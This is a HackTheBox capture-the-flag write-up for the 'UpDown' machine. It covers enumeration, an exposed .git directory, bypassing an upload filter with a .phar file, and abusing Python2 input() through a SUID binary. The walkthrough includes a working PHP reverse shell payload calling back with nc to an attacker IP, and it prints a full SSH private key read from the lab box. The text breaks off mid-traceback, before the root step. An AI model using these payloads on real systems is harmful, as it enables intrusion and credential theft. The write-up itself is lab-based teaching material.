# UpDown - HackTheBox - Writeup
Linux, 30 Base Points, Medium

![info.JPG](images/info.JPG)

## Machine

![‏‏UpDown.JPG](images/UpDown.JPG)
 
## TL;DR

To solve this machine, we start by using `nmap` to enumerate open services and find ports `22` and `80`.

***User***: Discovered virtual host `dev.siteisup.htb` and directory `/dev/.git`. Found that `Special-Dev: only4dev` HTTP header must be added to access `dev.siteisup.htb`. Uploaded `.phar` file, gained a reverse shell as `www-data` user. Found SUID for `developer` user that runs `python2` script with `input()` function, used `input()` to execute python code and obtained the SSH private key of `developer` user.

***Root***: By running `sudo -l` found that `usr/local/bin/easy_install` can be run as `root` and if the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access. Using that, a shell as `root` was obtained.


![pwn.JPG](images/pwn.JPG)


## UpDown Solution

### User

Let's begin by using `nmap` to scan the target machine:

```console
┌─[evyatar9@parrot]─[/hackthebox/UpDown]
└──╼ $ nmap -sV -sC -oA nmap/UpDown 10.10.11.177
Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-16 21:43 IST
Nmap scan report for 10.10.11.177
Host is up (0.072s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 9e:1f:98:d7:c8:ba:61:db:f1:49:66:9d:70:17:02:e7 (RSA)
|   256 c2:1c:fe:11:52:e3:d7:e5:f7:59:18:6b:68:45:3f:62 (ECDSA)
|_  256 5f:6e:12:67:0a:66:e8:e2:b7:61:be:c4:14:3a:d3:8e (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Is my Website up ?
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

Observing port `80`, we see that the following web page is hosted:

![port80.JPG](images/port80.JPG)

We have discovered the domain `siteisup.htb` and added it to `/etc/hosts`.

Using the tool `gobuster`, we found the following virtual host:
```console
┌─[evyatar9@parrot]─[/hackthebox/UpDown]
└──╼ $ gobuster vhost -u siteisup.htb -w /subdomains-top1milion.txt -o vhosts.gobuster -t 100
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:          http://siteisup.htb
[+] Method:       GET
[+] Threads:      100
[+] Wordlist:     subdomains-top1milion.txt
[+] User Agent:   gobuster/3.1.0
[+] Timeout:      10s
===============================================================
2022/11/16 21:50:27 Starting gobuster in VHOST enumeration mode
===============================================================
Found: dev.siteisup.htb (Status: 403) [Size: 281]
```


We have also added `dev.siteisup.htb` to `/etc/hosts`. By re-running `gobuster`, we have discovered the following paths:
```console
┌─[evyatar9@parrot]─[/hackthebox/UpDown]
└──╼ $ gobuster dir -u http://siteisup.htb/ -x php -w raft-medium-words.txt -t 100 -k --wildcard -o preprod.gobuster
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://siteisup.htb/
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                raft-medium-words.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
2022/11/17 23:14:11 Starting gobuster in directory enumeration mode
===============================================================
...
/dev                  (Status: 301) [Size: 310] [--> http://siteisup.htb/dev/
...
/server-status        (Status: 403) [Size: 277]
```

Let's re-run `gobuster` on [http://siteisup.htb/dev](http://siteisup.htb/dev) again::
```console
┌─[evyatar9@parrot]─[/hackthebox/UpDown]
└──╼ $ gobuster dir -u http://siteisup.htb/dev -x php -w raft-medium-words.txt -t 100 -k --wildcard -o preprod.gobuster
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://siteisup.htb/dev
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                raft-medium-words.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
2022/11/17 23:14:29 Starting gobuster in directory enumeration mode
===============================================================
/index.php            (Status: 200) [Size: 0] 
/.                    (Status: 200) [Size: 0] 
/.git                 (Status: 301) [Size: 315] [--> http://siteisup.htb/dev/.git/]
===============================================================
2022/11/17 23:16:47 Finished
===============================================================
```

By browsing to [http://siteisup.htb/dev/.git](http://siteisup.htb/dev/.git) we can see the following::

![devgit.JPG](images/devgit.JPG)

We will proceed to download the entire directory:
```console
┌─[evyatar9@parrot]─[/hackthebox/UpDown]
└──╼ $ wget --no-parent -r http://siteisup.htb/dev/.git/
...
┌─[evyatar9@parrot]─[/hackthebox/UpDown]
└──╼ $ ls -ltra
.git
```

By executing the command `git log"`, we can view the following information:
```console
┌─[evyatar9@parrot]─[/hackthebox/UpDown]
└──╼ $ git log
commit c8fcc4032487eaf637d41486eb150b7182ecd1f1 (HEAD)
Author: Abdou.Y <84577967+ab2pentest@users.noreply.github.com>
Date:   Wed Oct 20 19:38:08 2021 +0200

    Update checker.php

commit f67efd00c10784ae75bd251add3d52af50d7addd
Author: Abdou.Y <84577967+ab2pentest@users.noreply.github.com>
Date:   Wed Oct 20 18:33:11 2021 +0200

    Create checker.php

commit ab9bc164b4103de3c12ac97152e6d63040d5c4c6
Author: Abdou.Y <84577967+ab2pentest@users.noreply.github.com>
Date:   Wed Oct 20 18:30:58 2021 +0200

    Update changelog.txt

commit 60d2b3280d5356fe0698561e8ef8991825fec6cb
Author: Abdou.Y <84577967+ab2pentest@users.noreply.github.com>
Date:   Wed Oct 20 18:30:39 2021 +0200

    Create admin.php

commit c1998f8fbe683dd0bee8d94167bb896bd926c4c7
Author: Abdou.Y <84577967+ab2pentest@users.noreply.github.com>
Date:   Wed Oct 20 18:29:45 2021 +0200

    Add admin panel.

commit 35a380176ff228067def9c2ecc52ccfe705de640
Author: Abdou.Y <84577967+ab2pentest@users.noreply.github.com>
Date:   Wed Oct 20 17:40:49 2021 +0200

    Update changelog.txt

commit 57af03ba60cdcfe443e92c33c188c6cecb70eb10
Author: Abdou.Y <84577967+ab2pentest@users.noreply.github.com>
Date:   Wed Oct 20 17:29:42 2021 +0200

    Create index.php

commit 354fe069f6205af09f26c99cfe2457dea3eb6a6c
Author: Abdou.Y <84577967+ab2pentest@users.noreply.github.com>
Date:   Wed Oct 20 17:28:48 2021 +0200

    Delete .htpasswd

commit 8812785e31c879261050e72e20f298ae8c43b565
Author: Abdou.Y <84577967+ab2pentest@users.noreply.github.com>
Date:   Wed Oct 20 16:38:54 2021 +0200

    New technique in header to protect our dev vhost.

commit bc4ba79e596e9fd98f1b2837b9bd3548d04fe7ab
Author: Abdou.Y <84577967+ab2pentest@users.noreply.github.com>
Date:   Wed Oct 20 16:37:20 2021 +0200

    Update .htaccess
    
    New technique in header to protect our dev vhost.

commit 61e5cc0550d44c08b6c316d4f04d3fcc7783ae71
Author: Abdou.Y <84577967+ab2pentest@users.noreply.github.com>
Date:   Wed Oct 20 15:45:48 2021 +0200

    Update index.php

commit 3d66cd48933b35f4012066bcc7ee8d60f0069926
Author: Abdou.Y <84577967+ab2pentest@users.noreply.github.com>
Date:   Wed Oct 20 15:45:18 2021 +0200

    Create changelog.txt

commit 4fb192727c29c158a659911aadcdcc23e4decec5
Author: Abdou.Y <84577967+ab2pentest@users.noreply.github.com>
Date:   Wed Oct 20 15:28:26 2021 +0200

    Create stylesheet.css

commit 6f89af70fd23819664dd28d764f13efc02ecfd88
Author: Abdou.Y <84577967+ab2pentest@users.noreply.github.com>
Date:   Wed Oct 20 15:05:40 2021 +0200

    Create index.php

commit 8d1beb1cf5a1327c4cdb271b8efb1599b1b1c87f
Author: Abdou.Y <84577967+ab2pentest@users.noreply.github.com>
Date:   Wed Oct 20 15:05:08 2021 +0200

    Create .htpasswd

commit 6ddcc7a8ac393edb7764788c0cbc13a7a521d372
Author: Abdou.Y <84577967+ab2pentest@users.noreply.github.com>
Date:   Wed Oct 20 15:04:38 2021 +0200

    Create .htaccess
```

We can see the commits and by running the command `git checkout c8fcc4032487eaf637d41486eb150b7182ecd1f1`, we can access the last commit:
```console
┌─[evyatar9@parrot]─[/hackthebox/UpDown]
└──╼ $ ls -ltra
total 22
drwxrwx--- 1 root vboxsf    0 Nov 17 23:26 ..
-rwxrwx--- 1 root vboxsf 5531 Nov 17 23:29 stylesheet.css
-rwxrwx--- 1 root vboxsf  117 Nov 17 23:32 .htaccess
-rwxrwx--- 1 root vboxsf   59 Nov 17 23:33 admin.php
-rwxrwx--- 1 root vboxsf  147 Nov 17 23:33 changelog.txt
-rwxrwx--- 1 root vboxsf  273 Nov 17 23:33 index.php
drwxrwx--- 1 root vboxsf    0 Nov 17 23:33 uploads
-rwxrwx--- 1 root vboxsf 3145 Nov 17 23:36 checker.php
drwxrwx--- 1 root vboxsf 4096 Nov 17 23:36 .
drwxrwx--- 1 root vboxsf 4096 Nov 17 23:36 .git
```

Let's examine the file `.htaccess`:
```console
┌─[evyatar9@parrot]─[/hackthebox/UpDown]
└──╼ $ cat .htaccess 
SetEnvIfNoCase Special-Dev "only4dev" Required-Header
Order Deny,Allow
Deny from All
Allow from env=Required-Header
```

As we can see, the `dev` subdomain can only be accessed if we include the HTTP header `Special-Dev: only4dev`.

We can intercept the request to [http://dev.siteisup.htb/](http://dev.siteisup.htb/) and observe the following::

![specialheader.JPG](images/specialheader.JPG)

And now we are able to access the following webpage:

![devpage.JPG](images/devpage.JPG)

This page is `checker.php`, let's examine this file:
```php
cat checker.php 
<?php
if(DIRECTACCESS){
	die("Access Denied");
}
?>
<!DOCTYPE html>
<html>

  <head>
    <meta charset='utf-8' />
    <meta http-equiv="X-UA-Compatible" content="chrome=1" />
    <link rel="stylesheet" type="text/css" media="screen" href="stylesheet.css">
    <title>Is my Website up ? (beta version)</title>
  </head>

  <body>

    <div id="header_wrap" class="outer">
        <header class="inner">
          <h1 id="project_title">Welcome,<br> Is My Website UP ?</h1>
          <h2 id="project_tagline">In this version you are able to scan a list of websites !</h2>
        </header>
    </div>

    <div id="main_content_wrap" class="outer">
      <section id="main_content" class="inner">
        <form method="post" enctype="multipart/form-data">
			    <label>List of websites to check:</label><br><br>
				<input type="file" name="file" size="50">
				<input name="check" type="submit" value="Check">
		</form>

<?php

function isitup($url){
	$ch=curl_init();
	curl_setopt($ch, CURLOPT_URL, trim($url));
	curl_setopt($ch, CURLOPT_USERAGENT, "siteisup.htb beta");
	curl_setopt($ch, CURLOPT_HEADER, 1);
	curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
	curl_setopt($ch, CURLOPT_TIMEOUT, 30);
	$f = curl_exec($ch);
	$header = curl_getinfo($ch);
	if($f AND $header['http_code'] == 200){
		return array(true,$f);
	}else{
		return false;
	}
    curl_close($ch);
}

if($_POST['check']){
  
	# File size must be less than 10kb.
	if ($_FILES['file']['size'] > 10000) {
        die("File too large!");
    }
	$file = $_FILES['file']['name'];
	
	# Check if extension is allowed.
	$ext = getExtension($file);
	if(preg_match("/php|php[0-9]|html|py|pl|phtml|zip|rar|gz|gzip|tar/i",$ext)){
		die("Extension not allowed!");
	}
  
	# Create directory to upload our file.
	$dir = "uploads/".md5(time())."/";
	if(!is_dir($dir)){
        mkdir($dir, 0770, true);
    }
  
  # Upload the file.
	$final_path = $dir.$file;
	move_uploaded_file($_FILES['file']['tmp_name'], "{$final_path}");
	
  # Read the uploaded file.
	$websites = explode("\n",file_get_contents($final_path));
	
	foreach($websites as $site){
		$site=trim($site);
		if(!preg_match("#file://#i",$site) && !preg_match("#data://#i",$site) && !preg_match("#ftp://#i",$site)){
			$check=isitup($site);
			if($check){
				echo "<center>{$site}<br><font color='green'>is up ^_^</font></center>";
			}else{
				echo "<center>{$site}<br><font color='red'>seems to be down :(</font></center>";
			}	
		}else{
			echo "<center><font color='red'>Hacking attempt was detected !</font></center>";
		}
	}
	
  # Delete the uploaded file.
	@unlink($final_path);
}

function getExtension($file) {
	$extension = strrpos($file,".");
	return ($extension===false) ? "" : substr($file,$extension+1);
}
?>
      </section>
    </div>

    <div id="footer_wrap" class="outer">
      <footer class="inner">
        <p class="copyright">siteisup.htb (beta)</p><br>
        <a class="changelog" href="changelog.txt">changelog.txt</a><br>
      </footer>
    </div>

  </body>
</html>

```

We can see that there is an extension filter present:
```php
if(preg_match("/php|php[0-9]|html|py|pl|phtml|zip|rar|gz|gzip|tar/i",$ext)){
		die("Extension not allowed!");
}
```	

Let's use the tool [ffuf](https://github.com/ffuf/ffuf) to determine which file extensions can be uploaded.

First, we'll save the uploaded file and check the HTTP request to the file:
```HTTP
POST / HTTP/1.1
Host: dev.siteisup.htb
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://dev.siteisup.htb/
Content-Type: multipart/form-data; boundary=---------------------------400346544333176877002266488658
Content-Length: 382
Origin: http://dev.siteisup.htb
DNT: 1
Special-Dev: only4dev
Connection: close
Upgrade-Insecure-Requests: 1

-----------------------------400346544333176877002266488658
Content-Disposition: form-data; name="file"; filename="myfileFUZZ"
Content-Type: application/octet-stream

test

-----------------------------400346544333176877002266488658
Content-Disposition: form-data; name="check"

Check
-----------------------------400346544333176877002266488658--
```

As you can see, I have modified the filename from `filename="myfile.txt"` to `filename="myfileFUZZ"` for `ffuf`.

To test the HTTP response length, we need to create a wordlist with a few extensions, one of which is not an allowed extension:
```console
┌─[evyatar9@parrot]─[/hackthebox/UpDown]
└──╼ $ cat extentions.txt 
.php
.txt
.test
┌─[evyatar9@parrot]─[/hackthebox/UpDown]
└──╼ $ ./ffuf -request req -request-proto http -w extentions.txt

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.5.0-dev
________________________________________________

 :: Method           : POST
 :: URL              : http://dev.siteisup.htb/
 :: Wordlist         : FUZZ: extentions.txt
 :: Header           : Special-Dev: only4dev
 :: Header           : Upgrade-Insecure-Requests: 1
 :: Header           : Host: dev.siteisup.htb
 :: Header           : Accept-Encoding: gzip, deflate
 :: Header           : Referer: http://dev.siteisup.htb/
 :: Header           : Origin: http://dev.siteisup.htb
 :: Header           : DNT: 1
 :: Header           : User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0
 :: Header           : Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
 :: Header           : Accept-Language: en-US,en;q=0.5
 :: Header           : Content-Type: multipart/form-data; boundary=---------------------------400346544333176877002266488658
 :: Header           : Connection: close
 :: Data             : -----------------------------400346544333176877002266488658
Content-Disposition: form-data; name="file"; filename="urlsFUZZ"
Content-Type: application/octet-stream

test

-----------------------------400346544333176877002266488658
Content-Disposition: form-data; name="check"

Check
-----------------------------400346544333176877002266488658--
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

.php                    [Status: 200, Size: 534, Words: 3, Lines: 2, Duration: 88ms]
.test                   [Status: 200, Size: 649, Words: 1, Lines: 9, Duration: 91ms]
.txt                    [Status: 200, Size: 649, Words: 1, Lines: 9, Duration: 102ms]
:: Progress: [3/3] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors: 0 ::
```

We can see that the response length for allowed extensions is `649`, so we can use the flag `-ms` which matches the size to `649` and re-run the command with the list php-extentions.txt[php-extentions.txt](./php-extensions.txt):
```console
┌─[evyatar9@parrot]─[/hackthebox/UpDown]
└──╼ $ cat php-extentions.txt
.php
.php2
.php3
.php4
.php5
.php6
.php7
.phps
.phps
.pht
.phtm
.phtml
.pgif
.shtml
.htaccess
.phar
.inc
.hphp
.ctp
.module
```

And by re-running "ffuf", we obtain the following results:
```console
┌─[evyatar9@parrot]─[/hackthebox/UpDown]
└──╼ $ ffuf -request req -request-proto http -w php-extentions.txt -ms 649

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.5.0-dev
________________________________________________

 :: Method           : POST
 :: URL              : http://dev.siteisup.htb/
 :: Wordlist         : FUZZ: php-extentions.txt
 :: Header           : Referer: http://dev.siteisup.htb/
 :: Header           : Content-Type: multipart/form-data; boundary=---------------------------400346544333176877002266488658
 :: Header           : DNT: 1
 :: Header           : Special-Dev: only4dev
 :: Header           : Host: dev.siteisup.htb
 :: Header           : User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0
 :: Header           : Accept-Language: en-US,en;q=0.5
 :: Header           : Connection: close
 :: Header           : Upgrade-Insecure-Requests: 1
 :: Header           : Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
 :: Header           : Accept-Encoding: gzip, deflate
 :: Header           : Origin: http://dev.siteisup.htb
 :: Data             : -----------------------------400346544333176877002266488658
Content-Disposition: form-data; name="file"; filename="urlsFUZZ"
Content-Type: application/octet-stream

test

-----------------------------400346544333176877002266488658
Content-Disposition: form-data; name="check"

Check
-----------------------------400346544333176877002266488658--
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response size: 649
________________________________________________

.module                 [Status: 200, Size: 649, Words: 1, Lines: 9, Duration: 161ms]
.htaccess               [Status: 200, Size: 649, Words: 1, Lines: 9, Duration: 174ms]
.pgif                   [Status: 200, Size: 649, Words: 1, Lines: 9, Duration: 239ms]
.phtm                   [Status: 200, Size: 649, Words: 1, Lines: 9, Duration: 247ms]
.ctp                    [Status: 200, Size: 649, Words: 1, Lines: 9, Duration: 251ms]
.inc                    [Status: 200, Size: 649, Words: 1, Lines: 9, Duration: 252ms]
.phar                   [Status: 200, Size: 649, Words: 1, Lines: 9, Duration: 252ms]
.pht                    [Status: 200, Size: 649, Words: 1, Lines: 9, Duration: 252ms]
:: Progress: [20/20] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors: 0 ::
```

We can see that the `.phar` extension is allowed. `.phar` files are similar to `.jar` files for java, but for `php`, and can be executed like a `php` file (by running it with `php` or including it in a script).

Let's take another look at the code:
```php
...
	# Check if extension is allowed.
	$ext = getExtension($file);
	if(preg_match("/php|php[0-9]|html|py|pl|phtml|zip|rar|gz|gzip|tar/i",$ext)){
		die("Extension not allowed!");
	}
  
	# Create directory to upload our file.
	$dir = "uploads/".md5(time())."/";
	if(!is_dir($dir)){
        mkdir($dir, 0770, true);
    }
  
  # Upload the file.
	$final_path = $dir.$file;
	move_uploaded_file($_FILES['file']['tmp_name'], "{$final_path}");
	
  # Read the uploaded file.
	$websites = explode("\n",file_get_contents($final_path));
	
	foreach($websites as $site){
		$site=trim($site);
		if(!preg_match("#file://#i",$site) && !preg_match("#data://#i",$site) && !preg_match("#ftp://#i",$site)){
			$check=isitup($site);
			if($check){
				echo "<center>{$site}<br><font color='green'>is up ^_^</font></center>";
			}else{
				echo "<center>{$site}<br><font color='red'>seems to be down :(</font></center>";
			}	
		}else{
			echo "<center><font color='red'>Hacking attempt was detected !</font></center>";
		}
	}
	
  # Delete the uploaded file.
	@unlink($final_path);
...
```

We can see that the file extension check can be bypassed by uploading a `.phar` file. The code then moves the file to the `uploads` directory and checks if the websites inside the file are up or down, and subsequently deletes our file.

Thus, we can upload a file containing many websites, giving us enough time to execute our web shell.

The first step is to upload the file [rev.phar](./rev.phar), which contains websites and a `PHP` reverse shell. It is important to ensure that the file size is less than 10KB:
```console
┌─[evyatar9@parrot]─[/hackthebox/UpDown]
└──╼ $ cat rev.phar
...
scp://evyatar9.com
scp://evyatar9.com
scp://evyatar9.com
scp://evyatar9.com
scp://evyatar9.com
scp://evyatar9.com
scp://evyatar9.com
scp://evyatar9.com
scp://evyatar9.com
<?php
 $descriptorspec = array(
   0 => array("pipe", "r"),
   1 => array("pipe", "w"),
   2 => array("file", "/tmp/error-output.txt", "a") 
);
$cwd = '/tmp';
$env = array('some_option' => 'aeiou');
$process = proc_open('sh', $descriptorspec, $pipes, $cwd, $env);
if (is_resource($process)) {
    fwrite($pipes[0], 'rm -f /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.9 4242 >/tmp/f');
    fclose($pipes[0]);
    echo stream_get_contents($pipes[1]);
    fclose($pipes[1]);
    $return_value = proc_close($process);
    echo "command returned $return_value\n";
}
?>
```

Next, select the file [rev.phar](./rev.phar) to upload on the `checker` website located at http://dev.siteisup.htb/. Interception of the request should be done using Burp, the same should be done on http://dev.siteisup.htb/upload:

![checker.JPG](images/checker.JPG)

Intercept the request and add the `Special-Dev: only4dev` header:

![intercept.JPG](images/intercept.JPG)

Repeat the same process for the `uploads` page:

![uploadintercept.JPG](images/uploadintercept.JPG)

We can see the following directory:

![uploads.JPG](images/uploads.JPG)

This directory contains our `rev.phar` file:

![rev.JPG](images/rev.JPG)

Clicking on the file will give us a reverse shell:
```console
┌─[evyatar9@parrot]─[/hackthebox/UpDown]
└──╼ $ nc -lvp 4242
listening on [any] 4242 ...
connect to [10.10.14.14] from siteisup.htb [10.10.11.177] 43808
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ hostname
updown
```

By checking which files have SUID permission, we have found the following file:
```console
-rwsr-x--- 1 developer www-data 17K Jun 22 15:45 /home/developer/dev/siteisup 
```

Let's reverse the binary using `Ghidra`, by examining the `main` function, we can see:
```c
undefined8 main(void)
{
  __gid_t __rgid;
  __uid_t __ruid;
  
  __rgid = getegid();
  __ruid = geteuid();
  setresgid(__rgid,__rgid,__rgid);
  setresuid(__ruid,__ruid,__ruid);
  puts("Welcome to \'siteisup.htb\' application\n");
  system("/usr/bin/python /home/developer/dev/siteisup_test.py");
  return 0;
}
```

The binary is running the `python` script (```$ ls -ltr /usr/bin/python
lrwxrwxrwx 1 root root 7 Apr 15  2020 /usr/bin/python -> python2
```) script ```/home/developer/dev/siteisup_test.py``` which contains:
```python
import requests

url = input("Enter URL here:")
page = requests.get(url)
if page.status_code == 200:
	print "Website is up"
else:
	print "Website is down"
```

The interesting part here is the `input` function in `python2`.

By reading the following article https://book.hacktricks.xyz/generic-methodologies-and-resources/python/bypass-python-sandboxes, we can try to run code using the `input` function. Because `python2` `input()` function allows executing python code before the program crashes. Let's try it:

```console
$ cd /home/developer/dev/         
$ ls
siteisup
siteisup_test.py
$ ./siteisup     
__import__("os").system("id")
uid=1002(developer) gid=33(www-data) groups=33(www-data)
Enter URL here:Traceback (most recent call last):
  File "/home/developer/dev/siteisup_test.py", line 4, in <module>
    page = requests.get(url)
  File "/usr/local/lib/python2.7/dist-packages/requests/api.py", line 75, in get
    return request('get', url, params=params, **kwargs)
  File "/usr/local/lib/python2.7/dist-packages/requests/api.py", line 61, in request
    return session.request(method=method, url=url, **kwargs)
  File "/usr/local/lib/python2.7/dist-packages/requests/sessions.py", line 515, in request
    prep = self.prepare_request(req)
  File "/usr/local/lib/python2.7/dist-packages/requests/sessions.py", line 453, in prepare_request
    hooks=merge_hooks(request.hooks, self.hooks),
  File "/usr/local/lib/python2.7/dist-packages/requests/models.py", line 318, in prepare
    self.prepare_url(url, params)
  File "/usr/local/lib/python2.7/dist-packages/requests/models.py", line 392, in prepare_url
    raise MissingSchema(error)
requests.exceptions.MissingSchema: Invalid URL '0': No scheme supplied. Perhaps you meant http://0?
Welcome to 'siteisup.htb' application

$ 
```

As we can see, we can run code using ```__import__("os").system("id")```, Let's get the SSH private key of ```developer``` user by running ```__import__("os").system("cat /home/developer/.ssh/id_rsa")```:

```console
$ ./siteisup
__import__("os").system("cat /home/developer/.ssh/id_rsa")
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
Enter URL here:Traceback (most recent call last):
  File "/home/developer/dev/siteisup_test.py", line 4, in <module>
    page = requests.get(url)
